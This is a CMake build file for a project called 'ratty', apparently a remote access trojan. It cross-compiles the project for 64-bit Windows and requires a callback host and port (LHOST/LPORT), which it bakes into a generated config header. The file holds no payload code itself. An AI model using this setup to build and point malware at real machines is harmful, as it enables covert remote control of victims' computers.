cmake_minimum_required(VERSION 3.28)
project(ratty)

# target Windows 64-Bit when compiling
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_SYSTEM_PROCESSOR x86_64)
set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)

# set std enforcement and compiler flags
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_FLAGS "-Wno-reorder -Wunused-variable -Wunused-parameter -Wnarrowing -Werror=narrowing -Wno-error=all")

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)

# when looking for includes on compile we want
# to search folders we store hpp files
include_directories(
    src/rat/hpp
    src/handler/hpp
    src/utilities/hpp
    # config.h is created in the cmake_bin_dir not within the project dir
    ${CMAKE_BINARY_DIR}/src/rat/hpp
    external
    )

# Add the source directory with its own CMakeLists.txt
add_subdirectory(test)
add_subdirectory(src/rat)
add_subdirectory(src/handler)

# Download the CLI11 parser into directory named "external".
set(CMAKE_EXTERNAL_SOURCE_DIR ${CMAKE_SOURCE_DIR}/external) # Creates folder if doesn't exists.
# Name of file is needed since content of file itself are being downloaded.
file(DOWNLOAD https://github.com/CLIUtils/CLI11/releases/download/v2.3.2/CLI11.hpp ${CMAKE_EXTERNAL_SOURCE_DIR}/CLI11.hpp)

#---- ENV vars are used to be set within config.h within cmake build dir
#---- the env vars are used referenced during compiling ratty

# Read from env vars if not passed directly
if(NOT DEFINED LHOST)
    set(LHOST "$ENV{LHOST}")
endif()
if(NOT DEFINED LPORT)
    set(LPORT "$ENV{LPORT}")
endif()

# If not defined, show error and exit
if(NOT LHOST)
    message(FATAL_ERROR "LHOST is not defined. Set it like: LHOST=127.0.0.1 cmake ../")
endif()
if(NOT LPORT)
    message(FATAL_ERROR "LPORT is not defined. Set it like: LPORT=4444 cmake ../")
endif()

# wrap lhost in quotes if needed
if(NOT LHOST MATCHES "^\".*\"$")
    set(LHOST "\"${LHOST}\"")
endif()

message(STATUS "Using LHOST = ${LHOST}")
message(STATUS "Using LPORT = ${LPORT}")

# specify config files
configure_file(
  "${CMAKE_SOURCE_DIR}/src/rat/hpp/config.h.in"
  "${CMAKE_BINARY_DIR}/src/rat/hpp/config.h"
)